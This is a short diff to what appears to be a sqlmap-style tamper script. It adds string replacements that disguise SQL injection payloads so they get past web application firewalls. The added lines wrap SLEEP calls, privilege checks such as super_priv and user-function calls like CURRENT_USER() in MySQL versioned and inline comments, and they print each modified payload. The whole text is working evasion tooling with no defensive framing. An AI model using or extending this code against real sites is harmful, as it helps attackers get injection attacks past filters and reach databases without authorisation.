@@ -18,6 +18,12 @@ def tamper(payload, **kwargs):
 		payload=payload.replace("--","/*!*/--")
 		payload=payload.replace("SELECT","/*!88888cas*/select")
 		payload=payload.replace("FROM","/*!99999c*//*!99999c*/from")
+		payload=payload.replace('SLEEP(','sleep/**/(')
+		payload=payload.replace('super_priv','/*!29440/**/super_priv*/')
+		payload=payload.replace('and host=','/*!29440and*/host/*!11440=*/')
+		payload=payload.replace('LIKE USER()','like (user/**/())')
+		payload=payload.replace('CURRENT_USER()','CURRENT_USER/**/()')
+		payload=payload.replace('SESSION_USER()','SESSION_USER(%0a)')
 		print payload
 
 		return payload
